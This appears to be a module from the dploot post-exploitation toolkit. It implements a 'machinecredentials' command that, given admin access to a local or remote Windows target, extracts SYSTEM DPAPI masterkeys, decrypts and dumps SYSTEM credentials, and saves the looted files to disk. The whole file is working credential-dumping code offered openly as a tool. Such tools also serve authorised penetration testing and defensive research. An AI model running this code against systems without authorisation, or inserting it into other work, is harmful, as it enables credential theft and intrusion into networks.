import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.lib.target import add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage


NAME = "machinecredentials"


class MachineCredentialsAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_generic(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeytriage.triage_system_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def credential_callback(credential):
                if self.options.quiet:
                    credential.dump_quiet()
                else:
                    credential.dump()

            cred_triage = CredentialsTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_credential_callback=credential_callback,
            )
            logging.info("Triage SYSTEM Credentials\n")
            cred_triage.triage_system_credentials()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, cred_triage.looted_files)

        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = MachineCredentialsAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump system credentials from local or remote target"
    )

    group = subparser.add_argument_group("machinecredentials options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
